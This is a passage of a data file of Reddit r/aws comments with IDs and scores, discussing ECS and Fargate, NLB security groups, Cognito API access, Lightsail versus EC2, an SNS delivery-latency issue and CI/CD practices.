This strategy optimized for cost over availability or durability because you're putting more eggs in fewer baskets, but it can reduce your costs.",2.0
g6laruc,izr1sb,"I'm pretty sure OP is talking about ECS, which is literally 'containers'",-1.0
g6lbp9f,izr1sb,Non Fargate ECS runs your containers on EC2 instances that you have in your AWS account. This is what the binpack strategy refers to. How the containers are deployed on those EC2 instances that you own.,3.0
g6lbvqk,izr1sb,ah,0.0
g6kk1pg,izq6rm,You could have the edge device subscribe to a specific mqtt topic and then publish the config to that topic.,2.0
g6yby66,izq6rm,"Another possible option, if it fits your use case and you're not already doing it:

- split your configuration into multiple thing shadows, and use named shadows
- e.g., our original thing shadow schema was getting too big, so we split it up to use one shadow for calibration data, one for configuration, and a third for other instructions
- this will only work if your overall configuration is a bit bigger than the shadow document size limit since only five named shadows are supported (5x 8kB), last time I checked
- if it's already bigger than 24kB, I'd probably look for another solution like brokentyro suggested

- A lambda function that mirrors the thing shadow API (not the REST portion, just the MQTT part — /update /delta /get etc.) and serves custom shadows from DynamoDB is one option we've looked at too.  We'll probably go this route in the long run.",2.0
g6kliuv,izq2db,"Probably a time to check out VPC privatelink endpoint services. 

Otherwise, check sg on the nlb target.",11.0
g6ksdho,izq2db,"It looks like modifying the SG on the targets worked.  I didn't even think to try this since LB and targets are on different ports.

Thanks!",4.0
g6kjqec,izq2db,Are you allowing the traffic on the NLB targets? NLBs do not have SGs attached (difference from the ALBs).,5.0
g6ksb5b,izq2db,"It looks like modifying the SG on the targets worked.  I didn't even think to try this since LB and targets are on different ports. I guess I need to learn/read some more.

Thanks!",2.0
g6kki6z,izq2db,What’s the NLB pointing to? Maybe the security group associated with whatever is behind the NLB not allowing connectivity from your other VPC?,2.0
g6ksc42,izq2db,It looks like modifying the SG on the targets worked.  I didn't even think to try this since LB and targets are on different ports.,1.0
g6kubew,izq2db,"One thing to consider is that with NLB there are two different modes. Instance target mode and IP target mode. 

Instance target mode is when you target an instance directly (technically its primary interface). In this mode, the original client IP persists thus this is what must be white listed on the target security group. Generally this might mean opening it up to 0.0.0.0/0 if the clients come from public internet. In other words, instance target mode means No Source NAT

In IP target mode (when you send directly to an IP address), you white list the private IP of the NLB ENIs. In other words, NLB performs source NAT in IP target mode.",2.0
g6mi0o9,izq2db,Can the load balancer be in its own subnet group?,1.0
g6mqio3,izq2db,"There's a limitation (which I can't find right now) publish on their site that specifically says that in tbis case you need to have c5 or m5 nodes behind it to work.

Had the same problem once. Just change the node type.",1.0
g6lmk1v,izmts4,"Networks drops are certainly possible and that looks like a fair bit of data. Are those graphs showing the traffic for all the affected instances? They're all dropping at the same time? If so, it's probably worth a ticket to AWS support.",2.0
g6mhmd8,izmts4,"Yes, that's all affected instances in the same subnet. It's a large streaming data load. Thanks for the second eyes and the AWS Support suggestion!",2.0
g6k31jr,izlvjk,"If you can run the RDBMS as RDS, I definitely do that (vs. installing software on an EC2 and managing it)

I don't know anything about WebLogic server, but if it has to be run on the same machine as the DB, then (and I never thought I'd say this) you may be better off running your workload on the Oracle cloud.",2.0
g6kbsj2,izlvjk,This. Just make sure that the security group is open to the Weblogic running on EC2 so they can communicate.,1.0
g6lwkn1,izlvjk,"I have setup many Oracle databases using AWS EC2 servers.

I have setup Oracle OEM using Weblogic 12.2.1.3 using a on premise server using Veeam.

I have setup Oracle Weblogic 11.2 on Linux with the repository database hosted on Solaris.

Using RDS as a Weblogic repository database is difficult because, part of the repository creation requires sys privileges.


Here are some instructions for installing preparing a Linux server to run Oracle 19c.

* [Installing the Oracle Preinstallation RPM From Unbreakable Linux Network](https://docs.oracle.com/en/database/oracle/oracle-database/18/cwlin/installing-the-oracle-preinstallation-rpm-from-unbreakable-linux-network.html#GUID-555F704E-BD48-4E0E-AC9D-038596601194)

I recommend using RHEL or Oracle Enterprise Linux.

If you use a server that is not listed on the Oracle Certification list, getting support is more difficult.

Once the Oracle 19c database is installed, installing Weblogic is just downloading the proper version and stepping through the install.

The Oracle Weblogic installer will tell you if you are missing any required packages.

* [Oracle WebLogic Server 12.2.1.4.0 Get Started](https://docs.oracle.com/en/middleware/fusion-middleware/weblogic-server/12.2.1.4/index.html)
* [Oracle Weblogic - Chapter 2 - 2 Installing the Oracle WebLogic Server and Coherence Software](https://docs.oracle.com/en/middleware/fusion-middleware/12.2.1.4/wlsig/installing-oracle-weblogic-server-and-coherence-software.html#GUID-E4241C14-42D3-4053-8F83-C748E059607A)
* [Oracle Database Installation Guide for Linux](https://docs.oracle.com/en/database/oracle/oracle-database/19/ladbi/index.html)

The most complicated part of the install if getting a Linux server running with minimal X Windows components so you can run the installer using the GUI.

It is possible to install the Oracle 19c database or the Oracle 19c Weblogic server using silent installs, but silent installs without the Oracle Installer GUI are moderately complex.",1.0
g6mpouq,izlvjk,"Yep silent installs of Weblogic are definitely complex. I have written the bash+WLST scripts to do it and it’s a pain in the ass. I would highly recommend that if silent installs are not a requirement, instead do it manually and create an AMI of it for future uses, auto scaling, etc.

OP: if you really really need to automate it via scripts, let me know in a private message",2.0
g77fqje,izlvjk,Is the Unbreakable Linux Kernel a necessity?  It appears that I will have to buy specific Linux support (another $395) to get my CSI number to allow registration.,1.0
g77ftfh,izlvjk,"I am using Oracle Linux 7.7, for what it is worth.",1.0
g78431m,izlvjk,"If you want to run OEL in a production environment, I recommend using OEL or RHEL. For a non prod system it is possible to use OEL with the free [Oracle Public Yum Server](https://yum.oracle.com/).

At the bottom of this page [www.oracle.com/linux/](https://www.oracle.com/linux/) there is a link to, a free download of OEL.

* [Oracle Linux](https://www.oracle.com/linux/)
* [Oracle Linux is free to download and distribute.](https://edelivery.oracle.com/linux?xd_co_f=276b2dde55e33323f9c1597400619136)
* [Oracle Linux 7 - Browse the Oracle Linux 7 package repositories](https://yum.oracle.com/oracle-linux-7.html)
* [Redhat - Download for Development Use](https://developers.redhat.com/products/rhel/download)

There are instructions online for using the free Oracle yum repositories with details about setting up /etc/yum.conf file.

Oracle 7.x is certified for Oracle database version 12.1, 12.2, 18c, 19c.

It's possible to run Oracle 18c or Oracle 19c under RHEL 8 or OEL 8, but it is not certified, and it takes a small amount of effort to get  RHEL8 or OEL 8 to work.

You can also download Redhat and use the free Oracle Public Yum Repositories.

For a production server, please buy support.

For development, non prod server, you can use the open source free Linux versions, but you will not automatically get security updates or other patches without a support contract.",1.0
g6jo7qq,izloz7,"ECS is Docker-based. ECS can run on a EC2 node you provide, or Fargate where there is no 'node' from your perspective and AWS handles that -- all you can see is the container.

Fargate is attractive as there is no node for you to maintain. Your use case may not be compatible with Fargate's limitations. Fargate is a little more expensive but frees you from node maintenance.",3.0
g6jp88g,izloz7,If I use ECS in EC2 I still have to maintain the EC2 node? I thought that would be automated. So ECS is basically identical to running EC2 with a bootstrap script that installs Docker and runs the container?,1.0
g6l7en3,izloz7,you could launch with the default ECS optimized ami and call it a day,1.0
g6jq93j,izloz7,"I'm confused: you are saying ECS is a container system, so is it a competitor of docker? If not, what utility does it provide if I can already run docker on an EC2?

Concerning fargate, can you ELI5 what the difference between fargate and running docker on an EC2 is? You mentioned not needing to manage the EC2 node and price differences. Is there anything fargate cannot do that you would need control of the node for?",1.0
g6jurk0,izloz7,"There's basically 3 options:

1) Run an EC2 instance, install docker, run your containerized app

2) Run an EC2 instance, install docker and the ECS agent, have AWS manage your docker, run your app (this is ECS)

3) Fargate: Don't run anything, just launch your container into AWS, and let AWS worry about everything. (This is the most expensive option obviously, because AWS manages your Compute and Docker)",4.0
g6jzg92,izloz7,"It seems weird to me that docker running on an EC2 is cheaper than just deploying a 'serverless' container via fargate, since it seems like the EC2 will be running extra compute in the background. But thanks for the write up, this was very helpful.",1.0
g6kzp5g,izloz7,"The more things other people do for you, the more expensive it gets. With fargate amazon does your server management, so you have to pay them for the privilege",3.0
g6myqmn,izloz7,"Fargate is basically an EC2 instance for your docker container that AWS takes care of, so you don’t need to worry about it. You’re using the same resources as if you were running your own EC2 instance, plus paying a premium for AWS manage it for you. 

Fargate runs 24/7 , it’s not like Lambda where it only runs when a request comes in.",1.0
g6jsh2v,izloz7,"ECS provides container orchestration, using docker to run the containers.  You can use ECS to create a service to keep tasks (groups of containers) running on multiple hosts.  For example, you can say that your service should have 4 instances of your task running, and ECS will provision those instances across your cluster.  If a task stops, ECS will start another.  ECS can also do rolling updates of your service.  ECS also has auto-scaling capabilities, as well.",3.0
g6jwwtq,izloz7,"Are you used to deploy application to containers? I don't know your use case but honestly, if you are asking such question better start with EC2. Learn about docker, get some general understanding on microservices and than ECS. Containers brings their unique set of challenges.

PS don't jump on Kubernetes hype train, at least not in the beginning.",2.0
g6jtsel,izloz7,"If you go the container route, you might consider Kubernetes. EKS is a managed Kubernetes service",-1.0
g6juhbg,izjtft,"Hmmmm... if your creating images, how come your file name is txt?

The AWS apis should have error objects returned that you could console out. If you have some permission issue it should be in there",1.0
g7arjfm,izjtft,"hey PatrickOFO, if you check the doc, there is a part where you have to have your index.js file and an inputFile.txt as well &gt;&gt;  

## Test the Lambda function

In this step, you invoke the Lambda function manually using sample Amazon S3 event data.

**To test the Lambda function**

1. Save the following Amazon S3 sample event data in a file and save it as inputFile.txt  
. You need to update the JSON by providing your sourcebucket  
 name and a .jpg object key.

&amp;#x200B;

one thing  that kept me thinking is that I used the index.js file that is in the doc the exact way is in the tutorial, the only thing I changed was the region, but on the tutorial I did not see a part where I needed to customize it for my src and dst bucket names or acc ID, idk if that also could be an issue. thanks for commenting btw",1.0
g6j6hks,izihe8,"Ooh, I just spotted they added AWS::StackId AWS::StackName to the Pseudo parameters. So the self monitoring stack is already easier to achieve than I thought!",6.0
g6j7lvk,izihe8, Thanks for putting this together. Stack sets is a great addition to cloud formation.,3.0
g6kh77d,izihe8,"I see so much useless blog spam r/aws, it’s nice to see a useful, well written blog post for a change. Great job, I work at AWS as a consultant and this is a better write up than I have found internally.",5.0
g6j5djv,izihe8,"I built a tool to deploy stacks across multiple accounts and regions. Have a look at https://takomo.io and let me know what you think, would it be useful for your usecases?",1.0
g6m80of,izihe8,"This tool looks like it would have been super useful before service-managed stack sets. Now that they exist, what’s the main value of it? I imagine it’s still useful, I just don’t know what it would be from reading the site. Maybe add a comparison to the site?",2.0
g6niept,izihe8,"Thanks for your comments. There is certainly much to improve in the docs, and I'm working on making it easier for people to understand the tool's purpose and how it works.

The ability to deploy stacks to multiple regions and accounts is important but not the only feature Takomo has. You still want to have a tool to parameterize and deploy your stacks. Here are some of the key features:

- Deploy multiple stacks with a single CLI command.
- Review changes to stack parameters and the template body before proceeding with the deployment.
- Define dependencies between stacks to ensure the correct deployment order.
- Resolve parameter values at deployment time, e.g., read values from outputs of other stacks or some other resources. You can implement custom parameter value resolvers with javascript.
- Use loops, if-conditions, and other features of Handlebars templating engine in your stack templates.
- Configure custom logic to be run on different deployment phases, e.g., run a script before a stack creation or update.
- Manage AWS Organization and its member accounts, organizational units, and authorization and management policies. Create new member accounts and deploy stacks to them.

It's cool that we can now define stack sets in CF templates. You still need to deploy the stacks, and this is something Takomo makes easier.",1.0
g6nopo0,izihe8,Ok that sounds pretty great. Now I see how it’s different. I’ll probably try play with it next week at work. I might have to refer my colleagues to this comment if they have the same question I did 😄,2.0
g6l4mo1,izihe8,If you use cloudformation stacks you can deploy to multiple regions as easy as you deploy your stack normally.,1.0
g6k9q6g,izicyu,"Having the exact same requirement,  following..",1.0
g727n0h,izicyu,We have decided to use the client credentials flow of oauth2. That means creating an app client in the cognito user pool for every user that wants to give their application access to our api. Maybe this isn't exactly the way to go but we are going to try it and see.,1.0
g6mret9,izicyu,"Had the same use-case for https://rungutan.com

Decided to generate AWS API Gateway keys and store the reference (key_id) in a DynamoDB table.

Works just fine for us.

PS: Cognito is used in parallel for normal auth flow on the webapp.",1.0
g6n2vf3,izicyu,"Thank you very much, another user used the same solution and I will definitely look into it.",1.0
g6j2gwt,izicyu,"You can trigger a lambda whenever someone logs in to make anything happen, such as generating a JWT or API key to call your developer API with.",1.0
g6j4388,izicyu,Right but then we would be handling the creation and storage of this key ourselves instead of letting Cognito do all that?,2.0
g6j9tal,izicyu,I believe this is the case and would be willing to think through this. I would use the sdk to generate api gateway api keys so that they can be managed. i need more investigation but i think i’d need to involve dynamo or cognito to keep a reference to owned keys. Anything to add?,1.0
g6lmwo7,izicyu,"I'm not sure Cognito was really designed to do what you want it to. It provides authn/authz, but I don't know that it's really meant to generate and manage api keys.",1.0
g6n3ojm,izicyu,If it's not meant for that then that's good to know. However I do see others ([like linkedIn](https://developer.linkedin.com/docs/v2/oauth2-client-credentials-flow)) use client credentials from the oauth2 flow to grant access to their api. This is preferably what we would want to use.,2.0
g6oz4s9,izicyu,"I think I understand what you're trying to do, but the Cognito app pool client is for interacting with Cognito itself, not your application. If you want to provide access to your api, you'll need to generate and manage those api keys within your app.",2.0
g6t6vgn,izicyu,"Alright thank you for your input. I guess in the concisest terms what I was hoping to achieve was:

users log in with cognito using oauth2. Users want to use our developer API and have to generate credentials (like an API key) but instead of API keys we would prefer to use the client credentials flow of oauth2 (and thus use cognito for this oauth part).

But I am starting to think that the client credentials flow isn't meant for this kind of interaction. And that it's more for giving access to api's that you already own. Like in a micro services architecture where you own all the api's and want to give them access to each other.",1.0
g6j3jsd,izcp0w,"When you launch a dedicated instance, the EC2 service looks for an actual physical server (hardware) in the data center that currently has no EC2 instances (VMs) running on it, and spins up your instance on that. If you launch additional dedicated instances after the first one, the service is likely to bring those up on that same hardware. However, there are no guarantees that will happen, and you don't get to make that choice.

The way that dedicated hosts (hosts now, not instances) works is that when you choose to run your instances on dedicated hosts, the EC2 service API returns a Host ID, which is for a physical host (server hardware) that AWS is setting aside for your exclusive use. Of course, they start billing you at that point. When you launch an EC2 instance, you now have the option of passing that Host ID as a parameter, which will ensure that the new instance comes up on that host, assuming there is available capacity for running an instance of the requested size.

Dedicated instances guarantees that your EC2 instance will be running on hardware that's not shared with another AWS customer. Dedicated hosts also does this, but lets you specify the host, once it's been set aside for your exclusive use. I believe that you need to keep at least one instance running on a dedicated host in order to prevent AWS from returning that hardware to general use/On Demand status.",4.0
g6jq9qf,izcp0w,"You saved my day, thanks allot . Really good explanation",2.0
g6jq8ql,izcp0w,"You saved my day, thank you so much . You really explained it really well",2.0
g6iti60,izfiiq,Yeah it's a bit like the new Route53 console,18.0
g6j03v0,izfiiq,Gawd is that thing terrible.,6.0
g6j2zwh,izfiiq,But worse.,2.0
g6j1tni,izfiiq,Heyooooo,1.0
g6ixrk4,izfiiq,"I suppose they will see the traffic and it is not worth developing it, but sometimes you need to enter urgently from the mobile and you have to use the browser and it sucks.",2.0
g6ivby9,izfiiq,"Agree, feels little like the API calls they make to gain data are horribly slow.  


Switched most of my workloads over the CLI instead..",1.0
g6joxkj,izfiiq,"We are talking about the mobile app, right?  I imagine it's slow because just about everything in AWS is a REST call.  So, there is bound to be slowness as the app makes multiple rest calls, receives and then renders, etc.

But...you had workloads using the (mobile) app?  How does that work?",1.0
g6iwq7g,izfiiq,"I use it for a quick check most of the times, wonder what do you want from it?",1.0
g6jfh51,izfiiq,I use it to start up and spin down ec2 when connecting to them from my iPhone. Also I can ad sec group rules on the fly when my vpn is changes.,1.0
g6jiagf,izfiiq,"yes me to, also to check an alarm in CW.",1.0
g6jj95i,izfiiq,"You think there is space for a mobile App. I was thinking an App where you can edit and create new items in DynamoDB, upload and download files from S3, push notifications and a lot of useful features for the most common services.

Do you think it can be useful for you?",1.0
g6k4z29,izfiiq,"It's useful if you realize you left something up you meant to tear down, or checking billing / utilisation on the fly. It's certainly a lot more useful than it used to be in my opinion!",1.0
g6kbkrm,izfiiq,I'd rather SSH into my computer and use the aws cli than use that app,1.0
g6ix8wd,izfiiq,I agree. The Azure app is so much better. Plus the AWS app can be a bit unstable at times. I'm glad I don't work with AWS anymore.,-2.0
g6iy9xb,izfiiq,"I feel the complete opposite, having had to struggle to maintain good architecture on Azure I love that I can actually do shit on AWS.

I never tried any app though, don't see a reason why",5.0
g6jcwso,izfiiq,"I only have the apps in case of emergency. I've never ACTUALLY had to use them, but I've tried administration on them as an experiment.",1.0
g6joiz9,izfiiq,"So, I can see preferring the Azure app over the AWS app (I don't think I've seen an update to the AWS app in a year or more), but do you actually prefer working with Azure over AWS overall / in-general?  I've yet to meet an Azure client or integrator that actually enjoys the Azure experience.  

Usually it's along the lines of ""Well, we use X, Y, Z so it just made sense to stick with Microsoft in the cloud"".",2.0
g6k9ihp,izfiiq,"AWS used to kick Azure's ass in every aspect. But Azure caught up fast and is right up there with AWS. The GUI is much friendlier, resources are easier to create, manage and find, and the capabilities are better in some ways and it has good insight tools.",1.0
g6ldrbs,izg0v0,"There's some new permissions required for the New(est) Console Experience, yes. This is known according to support, and it's not clear if it's intentional or if it'll be addressed in a later update. But right now, yes, new permissions are required for the new console",3.0
g6ix9ck,izg0v0,"Try using the CLI as that user eg. ""aws ec2 help"" for toggling the machine state.

If that works without the Description permission, then it sounds like the AWS web console specifically is trying to get the status for display purposes.",2.0
g6j7uin,izg0v0,my guess would be new UI is smart enough to check what instance type available for the AZ.,1.0
g6x6wer,izg0v0,"Thank you all for your help.

I also have confirmed from support that new permissions have to be added for user to successfully control instance status on New EC2 Experience.

In my case for the starting/stopping ec2 instances without errors, These are the required action that I need to add in my policy.

     ""ec2:DescribeInstanceAttribute"",
     ""ec2:DescribeVpcs""",1.0
g6iueqs,izgcay,"obviously rewriting is always a good thing if you have the time for it. but lambda can run bash no problem. obviously you need to persist the files to s3 for example. also trivially doable with AWS CLI, which is installed in lambda env. lambda limits need to be minded: you have 3G RAM, 900s time limit and 512MB disk.

if you rewrite, python is nice, node.js is nice too. it is a good idea to separate the download function and the processing function, since the download might use minimal RAM/CPU. lambda cost is directly dependent on RAM/CPU settings.

i'm not familiar with aws rds, but i assume they can load from s3. you can also look at aws glue, which is a dedicated etl solution.",6.0
g6ircso,izgcay,"You can now configure your AWS Lambda functions to run up to 15 minutes per execution. Previously, the maximum execution time (timeout) for a Lambda function was 5 minutes.

So if its ok for you - the idea to move that logic to lambda is good.",6.0
g6je8nj,izgcay,"You'd probably benefit from triggering later steps based on the success of each step, rather than using a collection of independent cron timers. SNS or SQS can link together the pieces you already have, but if you're looking at Lambda, Step Functions is there way to go.

Step Functions also makes it easier to break your workflow into several distinct steps (as /u/pint mentioned), making each function simpler and easier to maintain.",3.0
g6iwwdl,izfkte,"If the API method is set to no authentication, then no signature is needed.  If you’re using resource policies you will have to make sure it is allowed with a Principal of “*”.  Your postman call should be configured to not specify any authentication.",4.0
g6izdqa,izfkte,"I don't have any specific resource policy. Do I need to define a specific one with a Principal of ""\*""?

&amp;#x200B;

Edit : Yep, I did have to define one. Thanks for your answer!",1.0
g6iw5of,izbx55,You need to specify an AMI for your asg. How are you going to use 1 AMI for 2 CPU architectures?,3.0
g6i1xct,izbx55,"You can definitely do it running EKS, but these will be different ASGs underneath. MixedInstancesPolicy (Launch Template) may allow this in a single ASG, but I’ve not tried.

One reason for not allowing this would be the skewed performance stats you may get out of CW when aggregation by ASG.",2.0
g6i25jh,izbx55,I don't have direct access to ASGs and not sure if eksctl allowing this?,1.0
g6j80cy,izbx55,"Unlikely, you’ll need console or aws cli",1.0
g6hxk3o,izbghi,"**tl;dr** Either would work for your use case; if you're a new user or won't have that much traffic, use Lightsail, but if you have a large amount of consistent traffic, you'll likely want to consider EC2, depending on whether or not you can stay below burstable CPU utilization baselines.

----

If you're looking for a more DigitalOcean-/Vultr-/Linode-esque solution, then I think you should use Lightsail, as it is more comparable to the burstable instance options available from DigitalOcean/Vultr/Linode.

If you think you'll need something more powerful (or possibly more cost effective, depending on factors like amount of data egress, CPU usage/traffic, etc.), you can certainly go with EC2, just remember that you'll *also* be paying for data egress, storage, etc. If you have a large amount of traffic, or you otherwise need above certain baseline of CPU utilization (see [here](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/burstable-credits-baseline-concepts.html) and/or [here](https://lightsail.aws.amazon.com/ls/docs/en_us/articles/amazon-lightsail-viewing-instance-burst-capacity)), you'll *definitely* want to consider EC2, since you'll run into either CPU usage bottlenecking or higher costs if you go over the baseline CPU utilization for an extended period of time.

Lightsail *is* EC2, just in a way that's more comparable to simpler cloud providers. More specifically, it runs (last I checked) the T2/T3 family of burstable instances in EC2.",1.0
g6hyho2,izbghi,"Thank you, this is very helpful. So Lightsail should have no problem problem running a dynamic website with a HTML, CSS and Javascript front-end sending variables to a Python backend, then performing calculations in a database and sending outputs back to the front-end for display?

This website has no traffic at all since I'm creating for the first time now. Is it simple to scale from Lightsail to EC2 if the website gains a lot of traction? Thanks!",1.0
g6hywvw,izbghi,"&gt; Thank you, this is very helpful. So Lightsail should have no problem problem running a dynamic website with a HTML, CSS and Javascript front-end sending variables to a Python backend, then performing calculations in a database and sending outputs back to the front-end for display?

Yes, you should be perfectly fine doing this since you said you have practically no (or otherwise very little) traffic.

&gt; Is it simple to scale from Lightsail to EC2 if the website gains a lot of traction?

Yes. You can take a snapshot of a Lightsail instance's storage (which is just Elastic Block Store under the hood), which can then be used to make an EC2 instance. See [here](https://lightsail.aws.amazon.com/ls/docs/en_us/articles/amazon-lightsail-creating-ec2-instances-from-exported-snapshots) and [here](https://lightsail.aws.amazon.com/ls/docs/en_us/articles/amazon-lightsail-exporting-snapshots) for more info on exporting Lightsail snapshots.",1.0
g6i31aq,izbghi,So Lightsail is basically a lighter version of EC2 that is easier to use and better for lighter traffic but more costly if the traffic is high? Bu tthey can accomplish most of the same things?,1.0
g6i731j,izbghi,"Short answer: yes.

Long answer: it's a little bit more complicated than that, but yes (mostly).

Lightsail is good for light traffic or anything that wouldn't use too much CPU over a long period of time. For instance, if you had 1,000,000 visitors per hour, Apache or Nginx serving static content out of your instance would use less CPU to a Flask backend running things like signature computation and verification.

It all depends on your use case. If you can keep your CPU utilization at or below that CPU baseline performance (or only burst above it for short periods of time), Lightsail is likely to cheaper than EC2; however, if you constantly need above that CPU baseline performance (i.e., you're constantly at 100% CPU utilization), an equivalent M-family (i.e., the M5 or M5a instance families) would be better suited since you wouldn't be running a T-family at 100%, which costs more.

I am somewhat ignoring some things that come with Lightsail. For instance, the cheapest Lightsail instance *also* offers 1 TB free of data transfer and 20 GB of storage. Assuming you used all of that within one month whilst staying under the CPU baseline utilization, that's about $92 of savings compared to an equivalent EC2 T-family instance. That $92 of savings sounds nice, but if you're at a constant 100% CPU utilization on the base Lightsail instance, you'll lose at least *some* of those savings, so an M5 or M5a EC2 instance would be more cost effective in terms of compute power.

In other words, it all depends on your use case. EC2 vs. Lightsail would be a larger issue if you wanted to plan long into the future, but since you're just getting started with this, Lightsail will almost certainly suit you fine.",1.0
g6i92xt,izbcu8,"I use literally tens of thousands of SNS messages a day and have seen none of this. 

This must be unique to the op until I see further support. 

IE1 and UE2",20.0
g6ord4t,izbcu8,"I checked in with the SNS team, they did a deep dive, here's what they told me:

---

We have identified an issue in Amazon Simple Notification Service (SNS) that can result in elevated HTTP/HTTPS notification delivery latency for a small number of notifications when using the `maxReceivesPerSecond` attribute on HTTP/HTTPS subscription delivery policies. The `maxReceivesPerSecond` attribute is used to set a throttle on the maximum number of deliveries per second to these subscriptions to prevent overwhelming a customer’s destination HTTP/HTTPS endpoints. 

When the `maxReceivesPerSecond` attribute is set to a value less than 20,000, some customers may experience elevated HTTP/HTTPS notification delivery latency for a small number of their notifications. This outlier latency will be higher for lower values of `maxReceivesPerSecond`. For example, when `maxReceivesPerSecond` is set to 100, the latency can reach up to 2 minutes. When it's set to 10, latency can reach up to 17 minutes. When it's set to 1, latency can reach up to 2.8 hours. Note that all messages are ultimately delivered to the target endpoint. The delay is caused by a bug in the throttling system that resulted in use of an invalid capacity calculation.

We are working toward a permanent resolution, with an estimated availability of October 29, 2020. Until a permanent resolution is available, the workaround is to either increase maxReceivesPerSecond to a higher value, or to remove maxReceivesPerSecond from your HTTP/HTTPS delivery policies, if you are experiencing this issue.

This issue only relates to the throttling logic for the `maxReceivesPerSecond` feature for HTTP/HTTPS endpoints. Other SNS subscription types, including SQS, Lambda, email, mobile push, and SMS, are not affected by this issue.

If you are uncertain whether you might be experiencing this issue, please reach out to AWS Support and we will review your specific case.",17.0
g6i9s9p,izbcu8,There was no issues with us either,12.0
g6ickjn,izbcu8,Seems like a bad architecture choice too. If you already have SNS use SQS together. I would only rely on HTTP subscription if the sink has no other options.,5.0
g6ic16r,izbcu8,I don't get it. Why would changing the throttling limit on YOUR API Gateway require you customers to change their SNS?,3.0
g6id1qd,izbcu8,[deleted],2.0
g6ujvhz,izbcu8,"Yes, because obviously the guy just made up his experience. Made it up so much in fact, that Amazon has even responded with confirmation that this is indeed an issue in this very thread.

Assholes like you are the reason why people suck.",1.0
g6iy17p,izb2xj,You could add the alarms to the template by hand if you don't trust your macro.,1.0
g6johoc,izb2xj,"I wanted to avoid that because it requires so much duplication of similar-ish alarm entities.

But honestly after fighting this macro approach (which worked but was painful) it probably would have taken me less time to just write out some nested alert templates like you said.",1.0
g6i32mx,izb2xj,why not use the aws cli?,0.0
g6i7aba,izb2xj,"Like script something that uses the cli to spit out my alarms?

Everything being monitored is created via Cloudformation template. I want to make sure no cruft is left behind if a Stack is deleted or if a modification renames some of the resources. If I went with CLI based solution I feel like I have to do something complicated to make sure bad alarms are cleaned up.",1.0
g6j9e0f,izb2xj,"Well mea culpa. After fighting cloudformation all night I'm going with a solution similar-ish to this. Instead of cli I'll use BOTO3 but I'm just tossing my alert creation logic into Lambda.

The automatic alert macros did work, but since they transform before the template is run I had a hard time getting access to things like EC2 Name or other details that aren't known prior to build time that would make my alerts ""prettier"".

I probably could have defined those in an input or somewhere else I could reference in the alert templates this created but the cloudformation was already getting so messy it just didn't seem worth the squeeze.",1.0
g6pa8rr,izb2xj,Best of both worlds?  https://github.com/awslabs/aws-cloudformation-templates/blob/master/aws/services/CloudFormation/MacrosExamples/Boto3/README.md,1.0
g6ix5b6,izb2xj,"Might not exactly answer your question, however, here is some information about how we integrated app-based alerting with CloudWatch: [https://www.signl4.com/blog/aws-cloudwatch-alarms-mobile-phone-notification/](https://www.signl4.com/blog/aws-cloudwatch-alarms-mobile-phone-notification/)",0.0
g6isbo8,izb7nk,I'd not mix a migration and containerizing if your company is depending on the service being available. First get it running in AWS on EC2 and then get the skills and experience to containerize and manage a version of it with ECS/EKS in a pre-production environment. Promote it when you're stable.,1.0
g6kugyj,izb7nk,"Thanks for the insights. We are currently in prod on prem, so we have time to mature the AWS process and management of EKS. There will be lots of testing before switching off the on prem prod environment. Along the way there will also be testing.",1.0
g6itfl0,izb7nk,"You mentioned *costs* a couple of times in your post. Has your employer mentioned costs as a reason for the big drive to AWS? My experience has been that companies want the flexibility of the cloud despite the costs. Additionally it may seem like shifting these workloads to EC2 might be a more expensive way to run the application, but no longer maintaining hardware and redundant networking has huge benefits.

In short, you may care more about the costs than your employer does...",1.0
g6jforp,iz9tzj,"The IATA code is correct, 

regarding all the other numbers, I believe it's internal counting numbers that AWS created.",1.0
g6xmj23,iz9tzj,Probably an internal identifier for the location of the server that served your traffic,1.0
g717dxi,iz9tzj,I believe too :),1.0
g6hp5uc,iza42q,"You need to create a TGW in the eu-central region and then create a link between the TGWs. TGWs are regional constructs.

Check this out: https://docs.aws.amazon.com/vpc/latest/tgw/tgw-peering.html",2.0
g6hpc12,iza42q,Thank you very much!,1.0
g6hls81,iz9tn3,Why are you trying to build and not buy?,3.0
g6hmo4e,iz9tn3,For funsies?,1.0
g6hnp3m,iz9tn3,"If there are downstream people relying on this for research, I’d much rather buy than risk my job. 

Look, I’m all about building stuff on AWS, but I’m going to start small. When you build something that a million people will be hitting, that’s big time for me.",4.0
g6imtew,iz8nq2,"I'm using cdk. I can deploy a whole stack to a different environment, multiple in one account for Dev, than a stage and then a prod. Since it's all in git I'm not doing any version handling in aws.",8.0
g6j10zv,iz8nq2,So you’re doing all at once deployments?,1.0
g6k88ks,iz8nq2,Yes,1.0
g6lbuu7,iz8nq2,Pretty much the same except using SAM. All at once deployment.,1.0
g6ikgw4,iz8nq2,!RemindMe 12 hours,5.0
g6it0az,iz8nq2,!RemindMe 12 hours,1.0
g6j44kb,iz8nq2,"There is a 3 hour delay fetching comments.

I will be messaging you in 12 hours on [**2020-09-25 22:22:55 UTC**](http://www.wolframalpha.com/input/?i=2020-09-25%2022:22:55%20UTC%20To%20Local%20Time) to remind you of [**this link**](https://np.reddit.com/r/aws/comments/iz8nq2/whats_your_cicd_process_for_api_gateway_backed_by/g6it0az/?context=3)

[**CLICK THIS LINK**](https://np.reddit.com/message/compose/?to=RemindMeBot&amp;subject=Reminder&amp;message=%5Bhttps%3A%2F%2Fwww.reddit.com%2Fr%2Faws%2Fcomments%2Fiz8nq2%2Fwhats_your_cicd_process_for_api_gateway_backed_by%2Fg6it0az%2F%5D%0A%0ARemindMe%21%202020-09-25%2022%3A22%3A55%20UTC) to send a PM to also be reminded and to reduce spam.

^(Parent commenter can ) [^(delete this message to hide from others.)](https://np.reddit.com/message/compose/?to=RemindMeBot&amp;subject=Delete%20Comment&amp;message=Delete%21%20iz8nq2)

*****

|[^(Info)](https://np.reddit.com/r/RemindMeBot/comments/e1bko7/remindmebot_info_v21/)|[^(Custom)](https://np.reddit.com/message/compose/?to=RemindMeBot&amp;subject=Reminder&amp;message=%5BLink%20or%20message%20inside%20square%20brackets%5D%0A%0ARemindMe%21%20Time%20period%20here)|[^(Your Reminders)](https://np.reddit.com/message/compose/?to=RemindMeBot&amp;subject=List%20Of%20Reminders&amp;message=MyReminders%21)|[^(Feedback)](https://np.reddit.com/message/compose/?to=Watchful1&amp;subject=RemindMeBot%20Feedback)|
|-|-|-|-|",1.0
g6imcfo,iz8nq2,"Interested to see the answers.
I just use $latest at the moment, but would like to see what others do.",2.0
g6imrvw,iz8nq2,We do this at our company also,2.0
